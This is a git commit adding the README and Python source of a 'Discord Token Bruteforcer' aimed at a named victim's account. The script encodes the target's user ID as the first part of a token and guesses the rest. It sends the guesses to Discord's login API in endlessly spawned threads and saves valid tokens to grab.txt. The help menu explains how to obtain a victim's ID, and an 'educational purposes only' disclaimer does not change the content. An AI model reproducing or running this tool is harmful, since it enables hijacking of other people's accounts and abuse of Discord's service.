88d48249bb8a01f640b9119e7d96611f5c5c1d81
GikitSRC <123793568+GikitSRC@users.noreply.github.com>
2023-01-27 21:19:19 -0800

    Add files via upload

---
+++ README.md
@@ -0,0 +1,25 @@
+# Skyhax Discord Token Bruteforcer
+Bruteforces a user's Discord Token with their ID. This script will use Base64 to encode the first string of the victim's string with their ID, and bruteforce the rest. Chances are incredibly low, and the faster your computer is, the more chances of success there will be. Make sure to have a good internet connection while running this script, and have alot of data to spare! Successful output will be put in grab.txt (Will be created). This script is made for Educational Purposes only, illegal uses or abuse of this script will not be my responsibility.
+
+### Data Usage:
+🚨🚨🚨 This script uses ALOT of data, so be warned. Average data usage: 17GB/day 🚨🚨🚨
+
+## How to use
+1. Clone the repo, and navigate to the folder where file is saved in your command line
+2. Install Python on your computer [here](https://www.python.org)
+3. Install requirements by running the following command in CMD Prompt:
+```pip install -r requirements.txt```
+4. Run the python script with ```python3 main.py```
+5. Follow instructions on the menu to and continue.
+If any help is needed, you can type ``help`` into the start menu of the script.
+
+## Showcase image(s)
+![Main Menu](https://github.com/ChainedTears/Shadow_Bruteforcer/raw/main/showcasing/showcase.png)
+![Bruteforcing](https://github.com/ChainedTears/Shadow_Bruteforcer/raw/main/showcasing/Screenshot%202022-10-13%208.44.42%20AM.png)
+
+## To-Do
+- [x] Checks if token is correct
+- [x] User-Friendly Menu
+- [ ] Support server
+
+### This script/hack is made for education purposes only. Any misuse or abuse of this script can get you in huge trouble, and it is not my responsibility for any mess you are in by using this script/hack. 
---
+++ main.py
@@ -0,0 +1,77 @@
+import threading
+import random
+import requests
+import base64
+import string
+import os
+from colorama import Fore
+import time
+
+#Eyecandy effects :)
+
+print("""
+  ___________           .__                   
+ /   _____/  | _____.__.|  |__ _____  ___  ___
+ \_____  \|  |/ <   |  ||  |  \\__  \ \  \/  /
+ /        \    < \___  ||   Y  \/ __ \_>    < 
+/_______  /__|_ \/ ____||___|  (____  /__/\_ \
+
+""")
+
+print(Fore.CYAN + 'Presents...')
+time.sleep(2)
+
+print(Fore.YELLOW + 'Discord Token Bruteforcer - Made by 1mp0ss1bl3#6596 (Discord)')
+
+time.sleep(1)
+
+
+
+menu = input(f'{Fore.RED} Available commands: start/exit/help: ')
+if menu == 'exit':
+  print("Bye!")
+if menu == 'help':
+  menu = input(f'{Fore.GREEN} What do you need help with? (ID, Info, Contact, Exit) ')
+  if menu == 'ID':
+    print()
+    print("""To find the ID of the user you want to brute force follow the following instructions and restart the script:
+    1. Enable developer mode in Discord settings
+    2. Go back to main menu, and click on the victim's profile
+    3. Click on the three dots on upper right corner and select "Copy ID"
+    4. Restart this script, select start, and past ID here""")
+  if menu == 'Info':
+    print()
+    print("""The chances of generating a correct token is extremely low, so it is highly recommended to make a copy of this python file and run it on your own computer, for faster affects. The faster your computer is, the more tokens it will generate per second, increasing chances of getting the correct token. If a correct token is generated, this script will create a file named grab.txt and put correct token in.""")
+  if menu == 'Contact':
+    print()
+    print("Contact 1mp0ss1bl3#6596 on Discord for more help")
+  if menu == 'exit':
+    print("Bye!")
+if menu == 'start':
+
+        id_to_token = base64.b64encode((input("Input ID of user you want to Bruteforce (If you dont know how, select help from main menu): ")).encode("ascii"))
+  #This part uses Base64 to encode the ID to the first string of token
+        id_to_token = str(id_to_token)[2:-1]
+# To find a discord ID, right click profile and select copy ID (Make sure Developer mode is enabled)
+        def bruteforece():
+            while id_to_token == id_to_token:
+                token = id_to_token + '.' + ('').join(
+                    random.choices(string.ascii_letters + string.digits, k=4)) + '.' + (
+                            '').join(random.choices(string.ascii_letters + string.digits, k=25))
+#This part authorizes the token 
+                headers = {'Authorization': token}
+                login = requests.get('https://discordapp.com/api/v9/auth/login', headers=headers)
+                try:
+                    if login.status_code == 200:
+                        print('[+] VALID' + ' ' + token)
+                        f = open('grab.txt', "a+")
+                        f.write(f'{token}\n')
+                    else:
+                        print('[-] INVALID' + ' ' + token)
+                finally:
+                    print('')
+        def thread():
+            while True:
+                threading.Thread(target=bruteforece).start()
+
+        thread()
